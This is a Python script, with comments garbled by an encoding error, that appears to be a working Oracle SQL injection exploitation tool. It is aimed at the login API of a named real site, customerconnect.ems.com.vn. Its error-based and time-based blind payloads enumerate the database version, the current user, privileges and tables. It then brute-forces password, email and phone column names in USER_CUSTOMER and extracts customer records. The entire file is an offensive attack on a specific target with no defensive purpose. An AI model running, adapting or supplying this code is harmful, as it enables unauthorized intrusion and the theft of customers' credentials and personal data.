#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Oracle SQLæ³¨å…¥æ·±åº¦åˆ©ç”¨å·¥å…·
ç›®æ ‡: customerconnect.ems.com.vn
"""

import requests
import json
import time
import string
from typing import Optional, List, Dict
import sys

class OracleSQLiExploit:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def _inject(self, payload: str, password: str = "test") -> requests.Response:
        """å‘é€SQLæ³¨å…¥payload"""
        data = {
            "Username": payload,
            "Password": password
        }
        try:
            response = self.session.post(
                self.target_url,
                data=json.dumps(data),
                timeout=30
            )
            return response
        except requests.exceptions.Timeout:
            return None
        except Exception as e:
            print(f"[!] è¯·æ±‚é”™è¯¯: {e}")
            return None
    
    def test_connection(self) -> bool:
        """æµ‹è¯•ç›®æ ‡æ˜¯å¦å¯è®¿é—®"""
        print("[*] æµ‹è¯•ç›®æ ‡è¿æ¥...")
        try:
            response = self._inject("admin")
            if response:
                print(f"[âœ“] ç›®æ ‡å¯è®¿é—® (çŠ¶æ€ç : {response.status_code})")
                return True
            print("[!] ç›®æ ‡æ— å“åº”")
            return False
        except Exception as e:
            print(f"[!] è¿æ¥å¤±è´¥: {e}")
            return False
    
    def extract_via_error(self, query: str) -> Optional[str]:
        """ä½¿ç”¨Error-basedæ³¨å…¥æå–æ•°æ®"""
        print(f"[*] Error-basedæå–: {query}")
        
        # Oracle error-based payload template
        payload = (
            f"'||(SELECT CHR(77)||CHR(90) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self._inject(payload)
        if response:
            # æŸ¥æ‰¾é”™è¯¯ä¿¡æ¯ä¸­çš„æ•°æ®
            text = response.text
            try:
                # æå–æ ‡è®°ä¹‹é—´çš„æ•°æ® qjvjq...qkvzq
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    result = text[start:end]
                    print(f"[âœ“] æå–æˆåŠŸ: {result}")
                    return result
            except:
                pass
        return None
    
    def extract_via_blind(self, query: str, max_length: int = 50) -> Optional[str]:
        """ä½¿ç”¨Time-based blindæ³¨å…¥æå–æ•°æ®"""
        print(f"[*] Time-basedç›²æ³¨æå–: {query}")
        result = ""
        
        for pos in range(1, max_length + 1):
            for char_code in range(32, 127):
                # æ£€æµ‹æ¯ä¸ªå­—ç¬¦
                payload = (
                    f"'||(SELECT CHR(110) FROM DUAL WHERE 1=1 AND "
                    f"(CASE WHEN (ASCII(SUBSTR(({query}),{pos},1))={char_code}) "
                    f"THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3) "
                    f"ELSE 1 END)=1)||'"
                )
                
                start_time = time.time()
                response = self._inject(payload)
                elapsed_time = time.time() - start_time
                
                # å¦‚æœå“åº”æ—¶é—´è¶…è¿‡é˜ˆå€¼ï¼Œè¯´æ˜æ¡ä»¶ä¸ºçœŸ
                if elapsed_time > 5:
                    result += chr(char_code)
                    print(f"[*] ä½ç½® {pos}: {chr(char_code)} (å½“å‰ç»“æœ: {result})")
                    break
            else:
                # å¦‚æœæ²¡æœ‰å­—ç¬¦åŒ¹é…ï¼Œå¯èƒ½åˆ°è¾¾æœ«å°¾
                break
        
        if result:
            print(f"[âœ“] ç›²æ³¨æå–æˆåŠŸ: {result}")
            return result
        return None
    
    def enum_column_names(self, table_name: str, possible_names: List[str]) -> List[str]:
        """æš´åŠ›ç ´è§£è¡¨çš„åˆ—å"""
        print(f"\n[*] æš´åŠ›ç ´è§£è¡¨ {table_name} çš„åˆ—å...")
        found_columns = []
        
        for col_name in possible_names:
            print(f"[*] æµ‹è¯•åˆ—å: {col_name}")
            # å°è¯•æŸ¥è¯¢è¯¥åˆ—
            query = f"SELECT {col_name} FROM {table_name} WHERE ROWNUM=1"
            payload = f"'||(SELECT {col_name} FROM {table_name} WHERE ROWNUM=1)||'"
            
            response = self._inject(payload)
            if response and response.status_code != 500:
                # å¦‚æœæ²¡æœ‰æŠ¥é”™ï¼Œè¯´æ˜åˆ—å­˜åœ¨
                print(f"[âœ“] å‘ç°åˆ—: {col_name}")
                found_columns.append(col_name)
        
        return found_columns
    
    def extract_table_data(self, table_name: str, columns: List[str], limit: int = 10) -> List[Dict]:
        """æå–è¡¨æ•°æ®"""
        print(f"\n[*] æå–è¡¨ {table_name} çš„æ•°æ®...")
        results = []
        
        for row_num in range(1, limit + 1):
            row_data = {}
            for col in columns:
                query = (
                    f"SELECT {col} FROM "
                    f"(SELECT {col}, ROWNUM as rn FROM {table_name}) "
                    f"WHERE rn={row_num}"
                )
                
                # å°è¯•error-basedæå–
                data = self.extract_via_error(query)
                if data:
                    row_data[col] = data
                else:
                    # å¦‚æœerror-basedå¤±è´¥ï¼Œå°è¯•blind
                    data = self.extract_via_blind(query, max_length=30)
                    if data:
                        row_data[col] = data
            
            if row_data:
                results.append(row_data)
                print(f"[âœ“] ç¬¬ {row_num} è¡Œ: {row_data}")
            else:
                break
        
        return results
    
    def enum_all_tables(self) -> List[str]:
        """æšä¸¾å½“å‰schemaçš„æ‰€æœ‰è¡¨"""
        print("\n[*] æšä¸¾æ‰€æœ‰è¡¨...")
        
        # è·å–è¡¨æ•°é‡
        count_query = "SELECT COUNT(*) FROM USER_TABLES"
        count = self.extract_via_error(count_query)
        
        if count:
            print(f"[âœ“] æ‰¾åˆ° {count} ä¸ªè¡¨")
        
        # æå–è¡¨åï¼ˆé€ä¸ªï¼‰
        tables = []
        for i in range(1, 20):  # é™åˆ¶å‰20ä¸ªè¡¨
            query = (
                f"SELECT TABLE_NAME FROM "
                f"(SELECT TABLE_NAME, ROWNUM as rn FROM USER_TABLES) "
                f"WHERE rn={i}"
            )
            table_name = self.extract_via_error(query)
            if table_name:
                tables.append(table_name)
                print(f"[âœ“] è¡¨ {i}: {table_name}")
            else:
                break
        
        return tables
    
    def get_db_version(self) -> Optional[str]:
        """è·å–æ•°æ®åº“ç‰ˆæœ¬"""
        print("\n[*] è·å–æ•°æ®åº“ç‰ˆæœ¬...")
        query = "SELECT BANNER FROM V$VERSION WHERE ROWNUM=1"
        version = self.extract_via_error(query)
        if version:
            print(f"[âœ“] æ•°æ®åº“ç‰ˆæœ¬: {version}")
        return version
    
    def get_current_user(self) -> Optional[str]:
        """è·å–å½“å‰æ•°æ®åº“ç”¨æˆ·"""
        print("\n[*] è·å–å½“å‰ç”¨æˆ·...")
        query = "SELECT USER FROM DUAL"
        user = self.extract_via_error(query)
        if user:
            print(f"[âœ“] å½“å‰ç”¨æˆ·: {user}")
        return user
    
    def get_privileges(self) -> List[str]:
        """è·å–å½“å‰ç”¨æˆ·æƒé™"""
        print("\n[*] è·å–ç”¨æˆ·æƒé™...")
        privileges = []
        
        for i in range(1, 10):
            query = (
                f"SELECT PRIVILEGE FROM "
                f"(SELECT PRIVILEGE, ROWNUM as rn FROM USER_SYS_PRIVS) "
                f"WHERE rn={i}"
            )
            priv = self.extract_via_error(query)
            if priv:
                privileges.append(priv)
                print(f"[âœ“] æƒé™ {i}: {priv}")
            else:
                break
        
        return privileges
    
    def test_dba_access(self) -> bool:
        """æµ‹è¯•æ˜¯å¦æœ‰DBAæƒé™"""
        print("\n[*] æµ‹è¯•DBAæƒé™...")
        query = "SELECT VALUE FROM V$PARAMETER WHERE NAME='db_name'"
        result = self.extract_via_error(query)
        
        if result:
            print("[âœ“] å¯èƒ½å…·æœ‰DBAæƒé™ï¼")
            return True
        else:
            print("[!] æ²¡æœ‰DBAæƒé™")
            return False


def main():
    """ä¸»å‡½æ•°"""
    print("=" * 60)
    print("ğŸ¯ Oracle SQLæ³¨å…¥æ·±åº¦åˆ©ç”¨å·¥å…·")
    print("=" * 60)
    
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    
    exploit = OracleSQLiExploit(target_url)
    
    # æµ‹è¯•è¿æ¥
    if not exploit.test_connection():
        print("[!] æ— æ³•è¿æ¥åˆ°ç›®æ ‡ï¼Œé€€å‡º")
        sys.exit(1)
    
    print("\n" + "=" * 60)
    print("ğŸ“Š é˜¶æ®µ 1: ä¿¡æ¯æ”¶é›†")
    print("=" * 60)
    
    # è·å–åŸºæœ¬ä¿¡æ¯
    exploit.get_db_version()
    exploit.get_current_user()
    exploit.get_privileges()
    exploit.test_dba_access()
    
    print("\n" + "=" * 60)
    print("ğŸ“Š é˜¶æ®µ 2: æšä¸¾æ•°æ®åº“ç»“æ„")
    print("=" * 60)
    
    # æšä¸¾æ‰€æœ‰è¡¨
    tables = exploit.enum_all_tables()
    
    print("\n" + "=" * 60)
    print("ğŸ“Š é˜¶æ®µ 3: æš´åŠ›ç ´è§£USER_CUSTOMERåˆ—å")
    print("=" * 60)
    
    # å¸¸è§çš„å¯†ç åˆ—å
    possible_password_columns = [
        'PASSWORD', 'PWD', 'PASS', 'PASS_WORD', 'USER_PASSWORD',
        'ENCRYPTED_PASSWORD', 'PASSWORD_HASH', 'PASSWD', 'USER_PWD',
        'LOGIN_PASSWORD', 'ACCOUNT_PASSWORD', 'PASSPHRASE'
    ]
    
    # å¸¸è§çš„ç”¨æˆ·ä¿¡æ¯åˆ—å
    possible_columns = [
        'USERNAME', 'USER_NAME', 'EMAIL', 'PHONE', 'MOBILE',
        'FULL_NAME', 'FIRST_NAME', 'LAST_NAME', 'CUSTOMER_ID',
        'USER_ID', 'CREATED_DATE', 'LAST_LOGIN', 'STATUS',
        'ROLE', 'CUSTOMER_CODE', 'COMPANY_NAME', 'ADDRESS'
    ] + possible_password_columns
    
    found_columns = exploit.enum_column_names('USER_CUSTOMER', possible_columns)
    
    if found_columns:
        print(f"\n[âœ“] å‘ç°çš„åˆ—: {', '.join(found_columns)}")
        
        print("\n" + "=" * 60)
        print("ğŸ“Š é˜¶æ®µ 4: æå–USER_CUSTOMERæ•°æ®")
        print("=" * 60)
        
        # æå–å‰10æ¡ç”¨æˆ·æ•°æ®
        user_data = exploit.extract_table_data('USER_CUSTOMER', found_columns, limit=10)
        
        if user_data:
            print("\n[âœ“] æˆåŠŸæå–ç”¨æˆ·æ•°æ®:")
            for i, row in enumerate(user_data, 1):
                print(f"\nç”¨æˆ· {i}:")
                for key, value in row.items():
                    print(f"  {key}: {value}")
    
    print("\n" + "=" * 60)
    print("âœ… æ·±åº¦åˆ©ç”¨å®Œæˆ!")
    print("=" * 60)


if __name__ == "__main__":
    main()
